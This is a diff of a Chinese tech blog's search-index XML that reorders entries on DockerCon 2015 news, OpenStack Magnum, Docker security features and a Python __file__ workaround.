@@ -2428,26 +2428,122 @@ Available Commands:
     </entry>
     
     <entry>
-      <title><![CDATA[OpenStack Magnum社区及项目介绍]]></title>
-      <url>http://feisky.xyz/2015/06/23/openstack-magnum/</url>
-      <content type="html"><![CDATA[<p><img src="/images/magnum.png" alt=""></p>
-<p>Add network management for native docker <a href="https://blueprints.launchpad.net/magnum/+spec/native-docker-network" target="_blank" rel="external">https://blueprints.launchpad.net/magnum/+spec/native-docker-network</a></p>
-<p><a href="https://etherpad.openstack.org/p/magnum-native-docker-network" target="_blank" rel="external">https://etherpad.openstack.org/p/magnum-native-docker-network</a></p>
-<p>From <a href="http://dockone.io/article/445" target="_blank" rel="external">http://dockone.io/article/445</a></p>
+      <title><![CDATA[Weekly reading list (20150626)]]></title>
+      <url>http://feisky.xyz/2015/06/23/weekly-reading-list-20150626/</url>
+      <content type="html"><![CDATA[<p>这周最热的就是Dockercon了，列表里面很多都是docker相关的。</p>
+<h2 id="Open-Container-Project-OCP"><a href="#Open-Container-Project-OCP" class="headerlink" title="Open Container Project (OCP)"></a>Open Container Project (OCP)</h2><blockquote>
+<p>Today we’re pleased to announce that CoreOS, Docker, and a large group of industry leaders are working together on a standard container format through the formation of the Open Container Project (OCP). OCP is housed under the Linux Foundation, and is chartered to establish common standards for software containers. This announcement means we are starting to see the concepts behind the App Container spec and Docker converge. This is a win for both users of containers and our industry at large.</p>
+</blockquote>
+<p><a href="https://coreos.com/blog/app-container-and-the-open-container-project/" target="_blank" rel="external">https://coreos.com/blog/app-container-and-the-open-container-project/</a></p>
+<p>Docker is donating draft specifications and code for container image format and runtime for the new project. Docker’s <a href="https://github.com/docker/libcontainer" target="_blank" rel="external">LibContainer project</a> will become part of <a href="https://github.com/opencontainers/runc" target="_blank" rel="external">the new RunC project</a>. CoreOS cofounder and chief executive Alex Polvi wrote in a <a href="https://coreos.com/blog/app-container-and-the-open-container-project/" target="_blank" rel="external">blog post</a> that he expects a good portion of its appc container specification to become part of the project, while his team will turn its rkt container runtime “into a leading container runtime around the new shared container format.”</p>
+<p><a href="http://venturebeat.com/2015/06/22/docker-and-coreos-unite-to-start-the-open-container-project-and-standardize-runtime-image-format/" target="_blank" rel="external">http://venturebeat.com/2015/06/22/docker-and-coreos-unite-to-start-the-open-container-project-and-standardize-runtime-image-format/</a></p>
+<p>runc <a href="https://github.com/opencontainers/runc" target="_blank" rel="external">https://github.com/opencontainers/runc</a></p>
+<p>OCP <a href="http://www.opencontainers.org/" target="_blank" rel="external">http://www.opencontainers.org/</a></p>
+<p>OCP spec <a href="https://github.com/opencontainers/specs" target="_blank" rel="external">https://github.com/opencontainers/specs</a> 暂未公布，需要2-3周时间</p>
+<h2 id="Docker-hackathon"><a href="#Docker-hackathon" class="headerlink" title="Docker hackathon"></a>Docker hackathon</h2><p>一些有趣的项目包括：</p>
+<ul>
+<li><a href="https://github.com/dockervlan/" target="_blank" rel="external">docker vlan</a> implements the VLAN driver in libnetwork</li>
+<li><a href="https://github.com/snrism/swarm-sec" target="_blank" rel="external">swarm-sec</a>  Swarm Security Assessment tool</li>
+<li><a href="https://github.com/advanderveer/libsecurity" target="_blank" rel="external">libsecurity</a> A POC for using Docker to act on vulnerability releases in real time</li>
+<li>BenchRock 用来测试IaaS平台性能的工具</li>
+<li><a href="https://github.com/rancherio/sherdock" target="_blank" rel="external">sherdock</a> Automatic GC of images based on regexp, Find and delete orphan Docker volumes</li>
+</ul>
+<p>更多的项目见<a href="http://www.dockercon.com/hackathon" target="_blank" rel="external">http://www.dockercon.com/hackathon</a></p>
+<h2 id="Docker-experimental-binary"><a href="#Docker-experimental-binary" class="headerlink" title="Docker experimental binary"></a>Docker experimental binary</h2><blockquote>
+<p>Docker’s experimental binary gives you access to bleeding edge features that are not in, and may never make it into, Docker’s official release.  An experimental build allows users to try out features early and give feedback to the Docker maintainers.  In this way, we hope to refine our feature designs by exposing earlier to real-world usage.</p>
+<p>In all cases, experimental features have gone through the same level of refining and quality control than any code that makes it into Docker: the difference is that the user interface and APIs may change.</p>
+<p>Network and volume plugins are the very first experimental features introduced</p>
+<p>Unlike the regular Docker binary, the experimental channels is built and updated nightly on <a href="https://experimental.docker.com" target="_blank" rel="external">https://experimental.docker.com</a>. From one day to the next, new features may appear, while existing experimental features may be refined or entirely removed.</p>
+<p>Each experimental feature is documented in a dedicated experimental section.  This section explains the feature’s function and design goals. Because your feedback is essential to refine and decide on a feature’s future, you will also find links to GitHub issues where you can leave your comments, look for reported problems, or report on your experience.</p>
+</blockquote>
+<p><a href="http://blog.docker.com/2015/06/experimental-binary/" target="_blank" rel="external">http://blog.docker.com/2015/06/experimental-binary/</a></p>
+<h2 id="Docker-plugins"><a href="#Docker-plugins" class="headerlink" title="Docker plugins"></a>Docker plugins</h2><p>The Docker plugins mechanism is now available in the new <a href="https://github.com/docker/docker/tree/master/experimental" target="_blank" rel="external">Docker experimental channel</a>. Also available are the first Docker plugins, including <a href="http://clusterhq.com/docker-plugin" target="_blank" rel="external">Flocker</a> for portable volumes across hosts, and networking plugins available from <a href="http://blog.weave.works/2015/06/22/weave-as-a-docker-network-plugin/" target="_blank" rel="external">Weave</a>, <a href="http://www.projectcalico.org/calico-docker-1-7-libnetwork/" target="_blank" rel="external">Project Calico</a>, <a href="http://www.nuagenetworks.net/libnetwork-is-license-to-hyper-scale-for-docker-and-sdn/" target="_blank" rel="external">Nuage Networks</a>, <a href="http://blogs.cisco.com/datacenter/docker-and-the-rise-of-microservices" target="_blank" rel="external">Cisco</a>, <a href="http://blogs.vmware.com/networkvirtualization/2015/06/vmware-docker-networking.html" target="_blank" rel="external">VMware</a>, Microsoft, and <a href="http://blog.midonet.org/docker-networking-midonet/" target="_blank" rel="external">Midokura</a>.</p>
+<ul>
+<li>Network plugins**, which allow third-party container networking solutions to connect containers to container networks, making it easier for containers to talk to each other even if they are running on different machines.  </li>
+<li>Volume plugins**, which allow third-party container data management solutions to provide data volumes for containers which operate on data, such as databases, queues and key-value stores and other stateful applications that use the filesystem.</li>
+</ul>
+<p>To demonstrate the value of plugins we are going to show you an example, that <a href="https://plugins-demo-2015.github.io" target="_blank" rel="external">anyone can replicate themselves today</a>. The example two plugins to enable container migration for an application on the Docker platform.  We enhance an application with two extension points.</p>
+<p>• <a href="http://blog.weave.works/2015/06/18/weave-1-0-is-out-and-it-is-good/" target="_blank" rel="external">Weave</a> for portable networking, discovery, monitoring.<br>• <a href="https://clusterhq.com/" target="_blank" rel="external">Flocker</a> for portable volumes and data.<br>• A Docker Swarm cluster runs the application described by Docker Compose<br>• We start a database on node 1, then later reschedule it on node 2, and it keeps its volumes and network identity!<br>• All of this is combined into one easy Docker experience via plugins.</p>
+<p>See demo at <a href="https://plugins-demo-2015.github.io/" target="_blank" rel="external">https://plugins-demo-2015.github.io/</a> </p>
+<p><a href="http://blog.docker.com/2015/06/extending-docker-with-plugins/" target="_blank" rel="external">http://blog.docker.com/2015/06/extending-docker-with-plugins/</a></p>
+<h2 id="Disney-docker-deployment"><a href="#Disney-docker-deployment" class="headerlink" title="Disney docker deployment"></a>Disney docker deployment</h2><p>Here are some of the components that are in use in the Disney environment:</p>
+<ul>
+<li>Chef: Chef handles the hosts and laying down the configuration for the Mesos master, the Marathon framework, the ZooKeeper endpoint configurations, etc. Chef also handles the initial setup of Consul and HAProxy.</li>
+<li><ul>
+<li>Docker: Docker is the packaging solution. Services are packaged using Docker. The Dockerfile for an application resides in the application repo. Application builds include building the Docker image and pushing it to the appropriate registry.</li>
+</ul>
+</li>
+<li><ul>
+<li>Mesos: Mesos provides cluster scheduling, placing containers onto hosts. All interaction with Mesos comes through the frameworks (i.e., Marathon, spark, Cassandra, etc.). </li>
+</ul>
+</li>
+<li><ul>
+<li>Marathon: The main framework in use is Marathon, which enables running Docker on Mesos. Marathon deployments (handled via JSON descriptions) will deploy Docker images and configure them appropriately (which image to use, which ports to expose, etc.). Health checks are also included in the Marathon deployment file. Marathon also allows Disney to define the upgrade strategy, which enables them to control how new images are deployed.</li>
+</ul>
+</li>
+<li><ul>
+<li>Consul: Disney only uses the distributed key-value store functionality of Consul (not the service discovery aspect). Containers use consul-template to pull information from Consul to customize the configuration at run-time.</li>
+</ul>
+</li>
+<li><ul>
+<li>HAProxy: HAProxy handles the routing of requests. Two health checks are involved: one on the HAProxy side, and one on the back-end service side. HAProxy is completely configured via Marathon’s service discovery mechanism.</li>
+</ul>
+</li>
+<li><ul>
+<li>Jenkins: Jenkins handles the Docker build/push/deploy.</li>
+</ul>
+</li>
+</ul>
+<p><a href="http://blog.scottlowe.org/2015/06/23/scaling-new-services/" target="_blank" rel="external">http://blog.scottlowe.org/2015/06/23/scaling-new-services/</a></p>
+<h2 id="Docker-security"><a href="#Docker-security" class="headerlink" title="Docker security"></a>Docker security</h2><p>Docker能提供的安全保障将涵盖以下7点：</p>
+<ul>
+<li>namespace保障系统资源的隔离</li>
+<li>cgroup完成进程组资源的限制</li>
+<li>Linux的安全模块提供MAC（apparmor， SELinux）</li>
+<li>capabilities将root的权限细分为多种类型</li>
+<li>ulimit的功能更多维度的限制资源（docker 1.6之后支持）</li>
+<li>user namespace保障容器内部的root在host上并非root（预计docker 1.8支持）</li>
+<li>seccomp使得容器内进程受到系统调用权限的控制</li>
+</ul>
+<p>Docker在安全方面还做了以下工作：</p>
+<h3 id="降低镜像带来的安全风向"><a href="#降低镜像带来的安全风向" class="headerlink" title="降低镜像带来的安全风向"></a>降低镜像带来的安全风向</h3><ul>
+<li>设置更为精简的Linux发行版：</li>
+<li>移除不需要的package、用户以及二进制工具文件，</li>
+</ul>
+<h3 id="提出Tailored-Profiles"><a href="#提出Tailored-Profiles" class="headerlink" title="提出Tailored Profiles"></a>提出Tailored Profiles</h3><ul>
+<li>容器可以创建least-privildge的文件</li>
+<li>文件有能力随容器传递</li>
+<li>通过独立的文件配置表明所有的权限</li>
+<li>已经规划入runC</li>
+<li>描述所有的隔离特性</li>
+</ul>
+<p>Docker安全贡献的公司</p>
+<ul>
+<li>HuaWei在支持Docker的seccomp方面贡献有目共睹</li>
+<li>IBM大力贡献Docker的user namespace的支持</li>
+<li>Intel在Docker的bootchain方面投入效果可观</li>
+<li>RedHat则在SELinux方面的贡献受到社区的肯定</li>
+</ul>
+<p><a href="http://blog.daocloud.io/dockercon-day-2-security/" target="_blank" rel="external">http://blog.daocloud.io/dockercon-day-2-security/</a></p>
+<h2 id="Project-Orca"><a href="#Project-Orca" class="headerlink" title="Project Orca"></a>Project Orca</h2><p>Project Orca has a vision of providing a top-to-bottom integrated stack that takes all the tools and plumbing (Docker Engine, Docker Swarm, Networking, GUI, Docker Compose, security, plus tools for installation, deployment, configuration, etc.). Project Orca fits into the “run” portion of the “build-ship-run” triangle on which Docker focuses.</p>
+<blockquote>
+<p>The Orca demo starts out with a log in to a web-based UI. Hazlett shows how Orca integrates into directory services and provides role-based access controls, and shows the logging/auditing functionality, so that users can see what has happened. Orca will provide lists of images, as well as what’s inside the images (such as showing layers, and the sizes of layers). Orca has integration into Docker Swarm, to show the nodes in a Swarm cluster and manage the nodes in a Swarm cluster. Hazlett also shows how to see the images that are present in a cluster, pull updated images, and push them across the entire Swarm cluster. Naturally, Orca also shows the images that are running across the cluster, the images used by each container, and display the details for running containers (the node on which it’s running, the ports that are exposed, the resources that are in use, the volumes associated with the container). Viewing the logs from a Docker container is also readily accessible from within Orca, as is real-time streaming statistics for the containers. Orca introduces the idea of “stacks,” which correspond to a Docker Compose configuration (sounds a lot like OpenStack Heat to me). Deploying a stack is like docker-compose up, and application-specific (stack-specific) metrics are available within Orca. Orca also integrates the ability to scale the number of containers associated with a stack. Developers can update their application definitions (via changes to the Compose YAML definition), and Orca will allow those changes to be dynamically deployed to production without adverse affect to operations’ ability to scale up or scale down capacity.</p>
+</blockquote>
+<p><a href="http://blog.scottlowe.org/2015/06/23/dockercon-day2-general-session/" target="_blank" rel="external">http://blog.scottlowe.org/2015/06/23/dockercon-day2-general-session/</a></p>
+<p><a href="http://blog.daocloud.io/dockercon-day-2-production-readiness/" target="_blank" rel="external">http://blog.daocloud.io/dockercon-day-2-production-readiness/</a></p>
+<h2 id="Project-Bonneville"><a href="#Project-Bonneville" class="headerlink" title="Project Bonneville"></a>Project Bonneville</h2><blockquote>
+<p>Bonneville is a Docker daemon with custom VMware graph, execution and network drivers that delivers a fully-compatible API to vanilla Docker clients. The pure approach Bonneville takes is that the container is a VM, and the VM is a container. There is no distinction, no encapsulation, and no in-guest virtualization. All of the necessary container infrastructure is outside of the VM in the container host. The container is an x86 hardware virtualized VM – nothing more, nothing less.</p>
+</blockquote>
+<p><a href="http://blogs.vmware.com/cloudnative/introducing-project-bonneville" target="_blank" rel="external">http://blogs.vmware.com/cloudnative/introducing-project-bonneville</a></p>
+<p><a href="http://venturebeat.com/2015/06/22/everything-announced-at-dockercon-2015/" target="_blank" rel="external">http://venturebeat.com/2015/06/22/everything-announced-at-dockercon-2015/</a></p>
 ]]></content>
       
         <categories>
             
-            <category> OpenStack </category>
+            <category> Readings </category>
             
         </categories>
         
-        
-        <tags>
-            
-            <tag> OpenStack </tag>
-            
-        </tags>
         
     </entry>
     
@@ -2697,122 +2793,26 @@ Available Commands:
     </entry>
     
     <entry>
-      <title><![CDATA[Weekly reading list (20150626)]]></title>
-      <url>http://feisky.xyz/2015/06/23/weekly-reading-list-20150626/</url>
-      <content type="html"><![CDATA[<p>这周最热的就是Dockercon了，列表里面很多都是docker相关的。</p>
-<h2 id="Open-Container-Project-OCP"><a href="#Open-Container-Project-OCP" class="headerlink" title="Open Container Project (OCP)"></a>Open Container Project (OCP)</h2><blockquote>
-<p>Today we’re pleased to announce that CoreOS, Docker, and a large group of industry leaders are working together on a standard container format through the formation of the Open Container Project (OCP). OCP is housed under the Linux Foundation, and is chartered to establish common standards for software containers. This announcement means we are starting to see the concepts behind the App Container spec and Docker converge. This is a win for both users of containers and our industry at large.</p>
-</blockquote>
-<p><a href="https://coreos.com/blog/app-container-and-the-open-container-project/" target="_blank" rel="external">https://coreos.com/blog/app-container-and-the-open-container-project/</a></p>
-<p>Docker is donating draft specifications and code for container image format and runtime for the new project. Docker’s <a href="https://github.com/docker/libcontainer" target="_blank" rel="external">LibContainer project</a> will become part of <a href="https://github.com/opencontainers/runc" target="_blank" rel="external">the new RunC project</a>. CoreOS cofounder and chief executive Alex Polvi wrote in a <a href="https://coreos.com/blog/app-container-and-the-open-container-project/" target="_blank" rel="external">blog post</a> that he expects a good portion of its appc container specification to become part of the project, while his team will turn its rkt container runtime “into a leading container runtime around the new shared container format.”</p>
-<p><a href="http://venturebeat.com/2015/06/22/docker-and-coreos-unite-to-start-the-open-container-project-and-standardize-runtime-image-format/" target="_blank" rel="external">http://venturebeat.com/2015/06/22/docker-and-coreos-unite-to-start-the-open-container-project-and-standardize-runtime-image-format/</a></p>
-<p>runc <a href="https://github.com/opencontainers/runc" target="_blank" rel="external">https://github.com/opencontainers/runc</a></p>
-<p>OCP <a href="http://www.opencontainers.org/" target="_blank" rel="external">http://www.opencontainers.org/</a></p>
-<p>OCP spec <a href="https://github.com/opencontainers/specs" target="_blank" rel="external">https://github.com/opencontainers/specs</a> 暂未公布，需要2-3周时间</p>
-<h2 id="Docker-hackathon"><a href="#Docker-hackathon" class="headerlink" title="Docker hackathon"></a>Docker hackathon</h2><p>一些有趣的项目包括：</p>
-<ul>
-<li><a href="https://github.com/dockervlan/" target="_blank" rel="external">docker vlan</a> implements the VLAN driver in libnetwork</li>
-<li><a href="https://github.com/snrism/swarm-sec" target="_blank" rel="external">swarm-sec</a>  Swarm Security Assessment tool</li>
-<li><a href="https://github.com/advanderveer/libsecurity" target="_blank" rel="external">libsecurity</a> A POC for using Docker to act on vulnerability releases in real time</li>
-<li>BenchRock 用来测试IaaS平台性能的工具</li>
-<li><a href="https://github.com/rancherio/sherdock" target="_blank" rel="external">sherdock</a> Automatic GC of images based on regexp, Find and delete orphan Docker volumes</li>
-</ul>
-<p>更多的项目见<a href="http://www.dockercon.com/hackathon" target="_blank" rel="external">http://www.dockercon.com/hackathon</a></p>
-<h2 id="Docker-experimental-binary"><a href="#Docker-experimental-binary" class="headerlink" title="Docker experimental binary"></a>Docker experimental binary</h2><blockquote>
-<p>Docker’s experimental binary gives you access to bleeding edge features that are not in, and may never make it into, Docker’s official release.  An experimental build allows users to try out features early and give feedback to the Docker maintainers.  In this way, we hope to refine our feature designs by exposing earlier to real-world usage.</p>
-<p>In all cases, experimental features have gone through the same level of refining and quality control than any code that makes it into Docker: the difference is that the user interface and APIs may change.</p>
-<p>Network and volume plugins are the very first experimental features introduced</p>
-<p>Unlike the regular Docker binary, the experimental channels is built and updated nightly on <a href="https://experimental.docker.com" target="_blank" rel="external">https://experimental.docker.com</a>. From one day to the next, new features may appear, while existing experimental features may be refined or entirely removed.</p>
-<p>Each experimental feature is documented in a dedicated experimental section.  This section explains the feature’s function and design goals. Because your feedback is essential to refine and decide on a feature’s future, you will also find links to GitHub issues where you can leave your comments, look for reported problems, or report on your experience.</p>
-</blockquote>
-<p><a href="http://blog.docker.com/2015/06/experimental-binary/" target="_blank" rel="external">http://blog.docker.com/2015/06/experimental-binary/</a></p>
-<h2 id="Docker-plugins"><a href="#Docker-plugins" class="headerlink" title="Docker plugins"></a>Docker plugins</h2><p>The Docker plugins mechanism is now available in the new <a href="https://github.com/docker/docker/tree/master/experimental" target="_blank" rel="external">Docker experimental channel</a>. Also available are the first Docker plugins, including <a href="http://clusterhq.com/docker-plugin" target="_blank" rel="external">Flocker</a> for portable volumes across hosts, and networking plugins available from <a href="http://blog.weave.works/2015/06/22/weave-as-a-docker-network-plugin/" target="_blank" rel="external">Weave</a>, <a href="http://www.projectcalico.org/calico-docker-1-7-libnetwork/" target="_blank" rel="external">Project Calico</a>, <a href="http://www.nuagenetworks.net/libnetwork-is-license-to-hyper-scale-for-docker-and-sdn/" target="_blank" rel="external">Nuage Networks</a>, <a href="http://blogs.cisco.com/datacenter/docker-and-the-rise-of-microservices" target="_blank" rel="external">Cisco</a>, <a href="http://blogs.vmware.com/networkvirtualization/2015/06/vmware-docker-networking.html" target="_blank" rel="external">VMware</a>, Microsoft, and <a href="http://blog.midonet.org/docker-networking-midonet/" target="_blank" rel="external">Midokura</a>.</p>
-<ul>
-<li>Network plugins**, which allow third-party container networking solutions to connect containers to container networks, making it easier for containers to talk to each other even if they are running on different machines.  </li>
-<li>Volume plugins**, which allow third-party container data management solutions to provide data volumes for containers which operate on data, such as databases, queues and key-value stores and other stateful applications that use the filesystem.</li>
-</ul>
-<p>To demonstrate the value of plugins we are going to show you an example, that <a href="https://plugins-demo-2015.github.io" target="_blank" rel="external">anyone can replicate themselves today</a>. The example two plugins to enable container migration for an application on the Docker platform.  We enhance an application with two extension points.</p>
-<p>• <a href="http://blog.weave.works/2015/06/18/weave-1-0-is-out-and-it-is-good/" target="_blank" rel="external">Weave</a> for portable networking, discovery, monitoring.<br>• <a href="https://clusterhq.com/" target="_blank" rel="external">Flocker</a> for portable volumes and data.<br>• A Docker Swarm cluster runs the application described by Docker Compose<br>• We start a database on node 1, then later reschedule it on node 2, and it keeps its volumes and network identity!<br>• All of this is combined into one easy Docker experience via plugins.</p>
-<p>See demo at <a href="https://plugins-demo-2015.github.io/" target="_blank" rel="external">https://plugins-demo-2015.github.io/</a> </p>
-<p><a href="http://blog.docker.com/2015/06/extending-docker-with-plugins/" target="_blank" rel="external">http://blog.docker.com/2015/06/extending-docker-with-plugins/</a></p>
-<h2 id="Disney-docker-deployment"><a href="#Disney-docker-deployment" class="headerlink" title="Disney docker deployment"></a>Disney docker deployment</h2><p>Here are some of the components that are in use in the Disney environment:</p>
-<ul>
-<li>Chef: Chef handles the hosts and laying down the configuration for the Mesos master, the Marathon framework, the ZooKeeper endpoint configurations, etc. Chef also handles the initial setup of Consul and HAProxy.</li>
-<li><ul>
-<li>Docker: Docker is the packaging solution. Services are packaged using Docker. The Dockerfile for an application resides in the application repo. Application builds include building the Docker image and pushing it to the appropriate registry.</li>
-</ul>
-</li>
-<li><ul>
-<li>Mesos: Mesos provides cluster scheduling, placing containers onto hosts. All interaction with Mesos comes through the frameworks (i.e., Marathon, spark, Cassandra, etc.). </li>
-</ul>
-</li>
-<li><ul>
-<li>Marathon: The main framework in use is Marathon, which enables running Docker on Mesos. Marathon deployments (handled via JSON descriptions) will deploy Docker images and configure them appropriately (which image to use, which ports to expose, etc.). Health checks are also included in the Marathon deployment file. Marathon also allows Disney to define the upgrade strategy, which enables them to control how new images are deployed.</li>
-</ul>
-</li>
-<li><ul>
-<li>Consul: Disney only uses the distributed key-value store functionality of Consul (not the service discovery aspect). Containers use consul-template to pull information from Consul to customize the configuration at run-time.</li>
-</ul>
-</li>
-<li><ul>
-<li>HAProxy: HAProxy handles the routing of requests. Two health checks are involved: one on the HAProxy side, and one on the back-end service side. HAProxy is completely configured via Marathon’s service discovery mechanism.</li>
-</ul>
-</li>
-<li><ul>
-<li>Jenkins: Jenkins handles the Docker build/push/deploy.</li>
-</ul>
-</li>
-</ul>
-<p><a href="http://blog.scottlowe.org/2015/06/23/scaling-new-services/" target="_blank" rel="external">http://blog.scottlowe.org/2015/06/23/scaling-new-services/</a></p>
-<h2 id="Docker-security"><a href="#Docker-security" class="headerlink" title="Docker security"></a>Docker security</h2><p>Docker能提供的安全保障将涵盖以下7点：</p>
-<ul>
-<li>namespace保障系统资源的隔离</li>
-<li>cgroup完成进程组资源的限制</li>
-<li>Linux的安全模块提供MAC（apparmor， SELinux）</li>
-<li>capabilities将root的权限细分为多种类型</li>
-<li>ulimit的功能更多维度的限制资源（docker 1.6之后支持）</li>
-<li>user namespace保障容器内部的root在host上并非root（预计docker 1.8支持）</li>
-<li>seccomp使得容器内进程受到系统调用权限的控制</li>
-</ul>
-<p>Docker在安全方面还做了以下工作：</p>
-<h3 id="降低镜像带来的安全风向"><a href="#降低镜像带来的安全风向" class="headerlink" title="降低镜像带来的安全风向"></a>降低镜像带来的安全风向</h3><ul>
-<li>设置更为精简的Linux发行版：</li>
-<li>移除不需要的package、用户以及二进制工具文件，</li>
-</ul>
-<h3 id="提出Tailored-Profiles"><a href="#提出Tailored-Profiles" class="headerlink" title="提出Tailored Profiles"></a>提出Tailored Profiles</h3><ul>
-<li>容器可以创建least-privildge的文件</li>
-<li>文件有能力随容器传递</li>
-<li>通过独立的文件配置表明所有的权限</li>
-<li>已经规划入runC</li>
-<li>描述所有的隔离特性</li>
-</ul>
-<p>Docker安全贡献的公司</p>
-<ul>
-<li>HuaWei在支持Docker的seccomp方面贡献有目共睹</li>
-<li>IBM大力贡献Docker的user namespace的支持</li>
-<li>Intel在Docker的bootchain方面投入效果可观</li>
-<li>RedHat则在SELinux方面的贡献受到社区的肯定</li>
-</ul>
-<p><a href="http://blog.daocloud.io/dockercon-day-2-security/" target="_blank" rel="external">http://blog.daocloud.io/dockercon-day-2-security/</a></p>
-<h2 id="Project-Orca"><a href="#Project-Orca" class="headerlink" title="Project Orca"></a>Project Orca</h2><p>Project Orca has a vision of providing a top-to-bottom integrated stack that takes all the tools and plumbing (Docker Engine, Docker Swarm, Networking, GUI, Docker Compose, security, plus tools for installation, deployment, configuration, etc.). Project Orca fits into the “run” portion of the “build-ship-run” triangle on which Docker focuses.</p>
-<blockquote>
-<p>The Orca demo starts out with a log in to a web-based UI. Hazlett shows how Orca integrates into directory services and provides role-based access controls, and shows the logging/auditing functionality, so that users can see what has happened. Orca will provide lists of images, as well as what’s inside the images (such as showing layers, and the sizes of layers). Orca has integration into Docker Swarm, to show the nodes in a Swarm cluster and manage the nodes in a Swarm cluster. Hazlett also shows how to see the images that are present in a cluster, pull updated images, and push them across the entire Swarm cluster. Naturally, Orca also shows the images that are running across the cluster, the images used by each container, and display the details for running containers (the node on which it’s running, the ports that are exposed, the resources that are in use, the volumes associated with the container). Viewing the logs from a Docker container is also readily accessible from within Orca, as is real-time streaming statistics for the containers. Orca introduces the idea of “stacks,” which correspond to a Docker Compose configuration (sounds a lot like OpenStack Heat to me). Deploying a stack is like docker-compose up, and application-specific (stack-specific) metrics are available within Orca. Orca also integrates the ability to scale the number of containers associated with a stack. Developers can update their application definitions (via changes to the Compose YAML definition), and Orca will allow those changes to be dynamically deployed to production without adverse affect to operations’ ability to scale up or scale down capacity.</p>
-</blockquote>
-<p><a href="http://blog.scottlowe.org/2015/06/23/dockercon-day2-general-session/" target="_blank" rel="external">http://blog.scottlowe.org/2015/06/23/dockercon-day2-general-session/</a></p>
-<p><a href="http://blog.daocloud.io/dockercon-day-2-production-readiness/" target="_blank" rel="external">http://blog.daocloud.io/dockercon-day-2-production-readiness/</a></p>
-<h2 id="Project-Bonneville"><a href="#Project-Bonneville" class="headerlink" title="Project Bonneville"></a>Project Bonneville</h2><blockquote>
-<p>Bonneville is a Docker daemon with custom VMware graph, execution and network drivers that delivers a fully-compatible API to vanilla Docker clients. The pure approach Bonneville takes is that the container is a VM, and the VM is a container. There is no distinction, no encapsulation, and no in-guest virtualization. All of the necessary container infrastructure is outside of the VM in the container host. The container is an x86 hardware virtualized VM – nothing more, nothing less.</p>
-</blockquote>
-<p><a href="http://blogs.vmware.com/cloudnative/introducing-project-bonneville" target="_blank" rel="external">http://blogs.vmware.com/cloudnative/introducing-project-bonneville</a></p>
-<p><a href="http://venturebeat.com/2015/06/22/everything-announced-at-dockercon-2015/" target="_blank" rel="external">http://venturebeat.com/2015/06/22/everything-announced-at-dockercon-2015/</a></p>
+      <title><![CDATA[OpenStack Magnum社区及项目介绍]]></title>
+      <url>http://feisky.xyz/2015/06/23/openstack-magnum/</url>
+      <content type="html"><![CDATA[<p><img src="/images/magnum.png" alt=""></p>
+<p>Add network management for native docker <a href="https://blueprints.launchpad.net/magnum/+spec/native-docker-network" target="_blank" rel="external">https://blueprints.launchpad.net/magnum/+spec/native-docker-network</a></p>
+<p><a href="https://etherpad.openstack.org/p/magnum-native-docker-network" target="_blank" rel="external">https://etherpad.openstack.org/p/magnum-native-docker-network</a></p>
+<p>From <a href="http://dockone.io/article/445" target="_blank" rel="external">http://dockone.io/article/445</a></p>
 ]]></content>
       
         <categories>
             
-            <category> Readings </category>
+            <category> OpenStack </category>
             
         </categories>
         
+        
+        <tags>
+            
+            <tag> OpenStack </tag>
+            
+        </tags>
         
     </entry>
     
@@ -3479,6 +3479,22 @@ gear link -n "127.0.0.1:3306:10.16.138.101:49153" server/application_container_1
     </entry>
     
     <entry>
+      <title><![CDATA[Python __file__ not defined problem]]></title>
+      <url>http://feisky.xyz/2015/03/04/python-not-defined-problem/</url>
+      <content type="html"><![CDATA[<p><strong>file</strong>仅在文件中运行的时候才正常，而在交互式命令行中则需要使用变通的方法：</p>
+<figure class="highlight xl"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> inspect</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">if</span> <span class="built_in">not</span> hasattr(sys.modules[__name__], <span class="string">'__file__'</span>):</div><div class="line">    __file__ = inspect.getfile(inspect.currentframe())</div><div class="line"></div><div class="line">print os.<span class="built_in">path</span>.dirname(os.<span class="built_in">path</span>.abspath(__file__))</div></pre></td></tr></table></figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Docker acquires SDN startup SocketPlane]]></title>
       <url>http://feisky.xyz/2015/03/04/docker-acquires-sdn-startup-socketplane/</url>
       <content type="html"><![CDATA[<p>At <a href="http://socketplane.io/" target="_blank" rel="external">Socketplane</a> we started out as four guys with a collectively strong belief in open source and open communities. &nbsp;We aligned around a shared vision that we wanted to be a critical part of Docker’s once in a decade disruption. Now that we are <a href="http://www.businesswire.com/news/home/20150304005595/en/Docker-Acquires-SocketPlane-Drive-Open-Collaborative-Networking#.VPcQAVPF-Tk" target="_blank" rel="external">part of the Docker team</a>, we couldn’t be happier.</p>
@@ -3492,22 +3508,6 @@ gear link -n "127.0.0.1:3306:10.16.138.101:49153" server/application_container_1
         <tags>
             
             <tag> docker </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Python __file__ not defined problem]]></title>
-      <url>http://feisky.xyz/2015/03/04/python-not-defined-problem/</url>
-      <content type="html"><![CDATA[<p><strong>file</strong>仅在文件中运行的时候才正常，而在交互式命令行中则需要使用变通的方法：</p>
-<figure class="highlight xl"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> inspect</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">if</span> <span class="built_in">not</span> hasattr(sys.modules[__name__], <span class="string">'__file__'</span>):</div><div class="line">    __file__ = inspect.getfile(inspect.currentframe())</div><div class="line"></div><div class="line">print os.<span class="built_in">path</span>.dirname(os.<span class="built_in">path</span>.abspath(__file__))</div></pre></td></tr></table></figure>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> python </tag>
             
         </tags>
         
@@ -3570,6 +3570,42 @@ gear link -n "127.0.0.1:3306:10.16.138.101:49153" server/application_container_1
         <tags>
             
             <tag> Linux </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[How enable OpenStack allinone vm to access external network]]></title>
+      <url>http://feisky.xyz/2015/03/01/how-enable-openstack-allinone-vm-to-access-external-network/</url>
+      <content type="html"><![CDATA[<p>首先需要为OpenStack添加一个公网网络，假设All-in-one环境建的公网网段为10.10.10.0/24，公网网关为10.10.10.1。这样为虚拟机绑定公网IP后，由于网关是不存在的，虚拟机无法访问外网。那虚拟机如果想访问外网怎么办呢？</p>
